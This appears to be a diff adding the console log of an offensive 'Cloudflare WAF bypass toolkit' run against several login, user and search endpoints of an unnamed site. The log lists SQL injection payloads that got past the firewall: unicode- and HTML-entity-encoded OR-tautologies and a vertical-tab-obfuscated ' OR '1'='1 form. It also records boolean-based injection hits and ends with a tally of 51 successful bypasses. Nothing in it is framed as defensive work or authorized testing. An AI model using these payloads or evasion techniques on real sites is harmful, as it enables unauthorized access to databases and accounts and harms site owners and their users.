@@ -1,0 +1,201 @@
+
+    ╔═══════════════════════════════════════════════════════════╗
+    ║  💀 CLOUDFLARE WAF BYPASS TOOLKIT 💀                      ║
+    ║  8 Advanced Techniques to Evade Detection                 ║
+    ╚═══════════════════════════════════════════════════════════╝
+    
+📊 Found 7 SQLi endpoints to bypass
+
+[91m21:43:45 [CRITICAL] 💀🔥 RUNNING ALL CLOUDFLARE BYPASS TECHNIQUES 🔥💀[0m
+[94m21:43:45 [INFO] 
+============================================================[0m
+[91m21:43:45 [CRITICAL] TARGET: /api/auth?username=[0m
+[94m21:43:45 [INFO] ============================================================[0m
+[91m21:43:45 [CRITICAL] 🔥 TECHNIQUE 1: HPP on /api/auth[0m
+[91m21:43:45 [CRITICAL] 🔥 TECHNIQUE 2: ENCODING OBFUSCATION on /api/auth[0m
+[92m21:43:45 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: %u0027%u0029%u0020%u004f%u0052%u0020%u0028%u0027%u[0m
+[92m21:43:45 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: &#39;&#41;&#32;&#79;&#82;&#32;&#40;&#39;&#49;&#39;[0m
+[91m21:43:45 [CRITICAL] 🔥 TECHNIQUE 3: REQUEST SMUGGLING on /api/auth[0m
+[91m21:43:46 [CRITICAL] 🔥 TECHNIQUE 4: TIMING-BASED SQLi on /api/auth[0m
+[94m21:43:46 [INFO] ❌ No delay: 0.02s[0m
+[94m21:43:46 [INFO] ❌ No delay: 0.02s[0m
+[94m21:43:46 [INFO] ❌ No delay: 0.03s[0m
+[94m21:43:46 [INFO] ❌ No delay: 0.02s[0m
+[94m21:43:46 [INFO] ❌ No delay: 0.03s[0m
+[94m21:43:46 [INFO] ❌ No delay: 0.03s[0m
+[91m21:43:46 [CRITICAL] 🔥 TECHNIQUE 5: BOOLEAN-BASED SQLi on /api/auth[0m
+[91m21:43:47 [CRITICAL] 💎 BOOLEAN SQLi SUCCESS: TRUE=5809b vs FALSE=5851b[0m
+[91m21:43:47 [CRITICAL] 🔥 TECHNIQUE 6: IP ROTATION on /api/auth[0m
+[91m21:43:49 [CRITICAL] 🔥 TECHNIQUE 7: CASE VARIATION on /api/auth[0m
+[92m21:43:49 [SUCCESS] ✅ CASE VARIATION SUCCESS: ' %0bOR%0b '1'='1[0m
+[91m21:43:49 [CRITICAL] 🔥 TECHNIQUE 8: COMMENT OBFUSCATION on /api/auth[0m
+[92m21:43:49 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:43:49 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:43:49 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[94m21:43:50 [INFO] 
+============================================================[0m
+[91m21:43:50 [CRITICAL] TARGET: /user?user=[0m
+[94m21:43:50 [INFO] ============================================================[0m
+[91m21:43:50 [CRITICAL] 🔥 TECHNIQUE 1: HPP on /user[0m
+[91m21:43:51 [CRITICAL] 🔥 TECHNIQUE 2: ENCODING OBFUSCATION on /user[0m
+[92m21:43:51 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: %u0031%u0027%u0020%u004f%u0052%u0020%u0027%u0031%u[0m
+[92m21:43:51 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: &#49;&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#32;[0m
+[91m21:43:51 [CRITICAL] 🔥 TECHNIQUE 3: REQUEST SMUGGLING on /user[0m
+[91m21:43:51 [CRITICAL] 🔥 TECHNIQUE 4: TIMING-BASED SQLi on /user[0m
+[94m21:43:51 [INFO] ❌ No delay: 0.02s[0m
+[94m21:43:51 [INFO] ❌ No delay: 0.03s[0m
+[94m21:43:51 [INFO] ❌ No delay: 0.03s[0m
+[94m21:43:51 [INFO] ❌ No delay: 0.02s[0m
+[94m21:43:51 [INFO] ❌ No delay: 0.03s[0m
+[94m21:43:51 [INFO] ❌ No delay: 0.03s[0m
+[91m21:43:51 [CRITICAL] 🔥 TECHNIQUE 5: BOOLEAN-BASED SQLi on /user[0m
+[91m21:43:52 [CRITICAL] 🔥 TECHNIQUE 6: IP ROTATION on /user[0m
+[91m21:43:54 [CRITICAL] 🔥 TECHNIQUE 7: CASE VARIATION on /user[0m
+[92m21:43:55 [SUCCESS] ✅ CASE VARIATION SUCCESS: ' %0bOR%0b '1'='1[0m
+[91m21:43:55 [CRITICAL] 🔥 TECHNIQUE 8: COMMENT OBFUSCATION on /user[0m
+[92m21:43:55 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:43:55 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:43:55 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:43:55 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[94m21:43:56 [INFO] 
+============================================================[0m
+[91m21:43:56 [CRITICAL] TARGET: /user?username=[0m
+[94m21:43:56 [INFO] ============================================================[0m
+[91m21:43:56 [CRITICAL] 🔥 TECHNIQUE 1: HPP on /user[0m
+[91m21:43:56 [CRITICAL] 🔥 TECHNIQUE 2: ENCODING OBFUSCATION on /user[0m
+[92m21:43:56 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: %u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u[0m
+[92m21:43:56 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: &#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#61;&#39;[0m
+[91m21:43:57 [CRITICAL] 🔥 TECHNIQUE 3: REQUEST SMUGGLING on /user[0m
+[91m21:43:57 [CRITICAL] 🔥 TECHNIQUE 4: TIMING-BASED SQLi on /user[0m
+[94m21:43:57 [INFO] ❌ No delay: 0.03s[0m
+[94m21:43:57 [INFO] ❌ No delay: 0.04s[0m
+[94m21:43:57 [INFO] ❌ No delay: 0.02s[0m
+[94m21:43:57 [INFO] ❌ No delay: 0.02s[0m
+[94m21:43:57 [INFO] ❌ No delay: 0.03s[0m
+[94m21:43:57 [INFO] ❌ No delay: 0.03s[0m
+[91m21:43:57 [CRITICAL] 🔥 TECHNIQUE 5: BOOLEAN-BASED SQLi on /user[0m
+[91m21:43:58 [CRITICAL] 💎 BOOLEAN SQLi SUCCESS: TRUE=5839b vs FALSE=5733b[0m
+[91m21:43:58 [CRITICAL] 🔥 TECHNIQUE 6: IP ROTATION on /user[0m
+[91m21:44:00 [CRITICAL] 🔥 TECHNIQUE 7: CASE VARIATION on /user[0m
+[92m21:44:00 [SUCCESS] ✅ CASE VARIATION SUCCESS: ' %0bOR%0b '1'='1[0m
+[91m21:44:00 [CRITICAL] 🔥 TECHNIQUE 8: COMMENT OBFUSCATION on /user[0m
+[92m21:44:00 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:01 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:01 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:01 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[94m21:44:02 [INFO] 
+============================================================[0m
+[91m21:44:02 [CRITICAL] TARGET: /login?user=[0m
+[94m21:44:02 [INFO] ============================================================[0m
+[91m21:44:02 [CRITICAL] 🔥 TECHNIQUE 1: HPP on /login[0m
+[91m21:44:02 [CRITICAL] 🔥 TECHNIQUE 2: ENCODING OBFUSCATION on /login[0m
+[92m21:44:02 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: %u0031%u0027%u0020%u004f%u0052%u0020%u0027%u0031%u[0m
+[92m21:44:02 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: &#49;&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#32;[0m
+[91m21:44:02 [CRITICAL] 🔥 TECHNIQUE 3: REQUEST SMUGGLING on /login[0m
+[91m21:44:02 [CRITICAL] 🔥 TECHNIQUE 4: TIMING-BASED SQLi on /login[0m
+[94m21:44:02 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:02 [INFO] ❌ No delay: 0.03s[0m
+[94m21:44:02 [INFO] ❌ No delay: 0.03s[0m
+[94m21:44:02 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:02 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:02 [INFO] ❌ No delay: 0.02s[0m
+[91m21:44:02 [CRITICAL] 🔥 TECHNIQUE 5: BOOLEAN-BASED SQLi on /login[0m
+[91m21:44:03 [CRITICAL] 💎 BOOLEAN SQLi SUCCESS: TRUE=5766b vs FALSE=5809b[0m
+[91m21:44:03 [CRITICAL] 🔥 TECHNIQUE 6: IP ROTATION on /login[0m
+[91m21:44:06 [CRITICAL] 🔥 TECHNIQUE 7: CASE VARIATION on /login[0m
+[92m21:44:06 [SUCCESS] ✅ CASE VARIATION SUCCESS: ' %0bOR%0b '1'='1[0m
+[91m21:44:06 [CRITICAL] 🔥 TECHNIQUE 8: COMMENT OBFUSCATION on /login[0m
+[92m21:44:06 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:06 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:06 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:06 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[94m21:44:07 [INFO] 
+============================================================[0m
+[91m21:44:07 [CRITICAL] TARGET: /login?username=[0m
+[94m21:44:07 [INFO] ============================================================[0m
+[91m21:44:07 [CRITICAL] 🔥 TECHNIQUE 1: HPP on /login[0m
+[91m21:44:07 [CRITICAL] 🔥 TECHNIQUE 2: ENCODING OBFUSCATION on /login[0m
+[92m21:44:07 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: %u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u[0m
+[92m21:44:08 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: &#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#61;&#39;[0m
+[91m21:44:08 [CRITICAL] 🔥 TECHNIQUE 3: REQUEST SMUGGLING on /login[0m
+[91m21:44:08 [CRITICAL] 🔥 TECHNIQUE 4: TIMING-BASED SQLi on /login[0m
+[94m21:44:08 [INFO] ❌ No delay: 0.03s[0m
+[94m21:44:08 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:08 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:08 [INFO] ❌ No delay: 0.03s[0m
+[94m21:44:08 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:08 [INFO] ❌ No delay: 0.03s[0m
+[91m21:44:08 [CRITICAL] 🔥 TECHNIQUE 5: BOOLEAN-BASED SQLi on /login[0m
+[91m21:44:09 [CRITICAL] 💎 BOOLEAN SQLi SUCCESS: TRUE=5800b vs FALSE=5842b[0m
+[91m21:44:09 [CRITICAL] 🔥 TECHNIQUE 6: IP ROTATION on /login[0m
+[91m21:44:11 [CRITICAL] 🔥 TECHNIQUE 7: CASE VARIATION on /login[0m
+[92m21:44:11 [SUCCESS] ✅ CASE VARIATION SUCCESS: ' %0bOR%0b '1'='1[0m
+[91m21:44:11 [CRITICAL] 🔥 TECHNIQUE 8: COMMENT OBFUSCATION on /login[0m
+[92m21:44:12 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:12 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:12 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:12 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[94m21:44:13 [INFO] 
+============================================================[0m
+[91m21:44:13 [CRITICAL] TARGET: /search?id=[0m
+[94m21:44:13 [INFO] ============================================================[0m
+[91m21:44:13 [CRITICAL] 🔥 TECHNIQUE 1: HPP on /search[0m
+[91m21:44:13 [CRITICAL] 🔥 TECHNIQUE 2: ENCODING OBFUSCATION on /search[0m
+[92m21:44:13 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: %u0027%u0029%u0020%u004f%u0052%u0020%u0028%u0027%u[0m
+[92m21:44:13 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: &#39;&#41;&#32;&#79;&#82;&#32;&#40;&#39;&#49;&#39;[0m
+[91m21:44:13 [CRITICAL] 🔥 TECHNIQUE 3: REQUEST SMUGGLING on /search[0m
+[91m21:44:13 [CRITICAL] 🔥 TECHNIQUE 4: TIMING-BASED SQLi on /search[0m
+[94m21:44:13 [INFO] ❌ No delay: 0.03s[0m
+[94m21:44:13 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:13 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:13 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:13 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:13 [INFO] ❌ No delay: 0.02s[0m
+[91m21:44:13 [CRITICAL] 🔥 TECHNIQUE 5: BOOLEAN-BASED SQLi on /search[0m
+[91m21:44:15 [CRITICAL] 🔥 TECHNIQUE 6: IP ROTATION on /search[0m
+[91m21:44:17 [CRITICAL] 🔥 TECHNIQUE 7: CASE VARIATION on /search[0m
+[92m21:44:17 [SUCCESS] ✅ CASE VARIATION SUCCESS: ' %0bOR%0b '1'='1[0m
+[91m21:44:17 [CRITICAL] 🔥 TECHNIQUE 8: COMMENT OBFUSCATION on /search[0m
+[92m21:44:17 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:17 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:17 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[94m21:44:18 [INFO] 
+============================================================[0m
+[91m21:44:18 [CRITICAL] TARGET: /search?user=[0m
+[94m21:44:18 [INFO] ============================================================[0m
+[91m21:44:18 [CRITICAL] 🔥 TECHNIQUE 1: HPP on /search[0m
+[91m21:44:18 [CRITICAL] 🔥 TECHNIQUE 2: ENCODING OBFUSCATION on /search[0m
+[92m21:44:19 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: %u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u[0m
+[92m21:44:19 [SUCCESS] ✅ ENCODING BYPASS SUCCESS: &#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#61;&#39;[0m
+[91m21:44:19 [CRITICAL] 🔥 TECHNIQUE 3: REQUEST SMUGGLING on /search[0m
+[91m21:44:19 [CRITICAL] 🔥 TECHNIQUE 4: TIMING-BASED SQLi on /search[0m
+[94m21:44:19 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:19 [INFO] ❌ No delay: 0.03s[0m
+[94m21:44:19 [INFO] ❌ No delay: 0.03s[0m
+[94m21:44:19 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:19 [INFO] ❌ No delay: 0.02s[0m
+[94m21:44:19 [INFO] ❌ No delay: 0.03s[0m
+[91m21:44:19 [CRITICAL] 🔥 TECHNIQUE 5: BOOLEAN-BASED SQLi on /search[0m
+[91m21:44:20 [CRITICAL] 💎 BOOLEAN SQLi SUCCESS: TRUE=5769b vs FALSE=5833b[0m
+[91m21:44:20 [CRITICAL] 🔥 TECHNIQUE 6: IP ROTATION on /search[0m
+[91m21:44:22 [CRITICAL] 🔥 TECHNIQUE 7: CASE VARIATION on /search[0m
+[92m21:44:22 [SUCCESS] ✅ CASE VARIATION SUCCESS: ' %0bOR%0b '1'='1[0m
+[91m21:44:22 [CRITICAL] 🔥 TECHNIQUE 8: COMMENT OBFUSCATION on /search[0m
+[92m21:44:23 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:23 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+[92m21:44:23 [SUCCESS] ✅ COMMENT OBFUSCATION SUCCESS[0m
+
+============================================================
+💀 CLOUDFLARE BYPASS SUMMARY 💀
+============================================================
+❌ HPP: No bypasses found
+✅ ENCODING: 14 successful bypasses
+❌ SMUGGLING: No bypasses found
+❌ TIMING_SQLI: No bypasses found
+✅ BOOLEAN_SQLI: 5 successful bypasses
+❌ IP_ROTATION: No bypasses found
+✅ CASE_VARIATION: 7 successful bypasses
+✅ COMMENT_OBFUSCATION: 25 successful bypasses
+
+💎 TOTAL SUCCESSFUL BYPASSES: 51
+📁 Results saved to: output/CLOUDFLARE_BYPASS/bypass_results.json
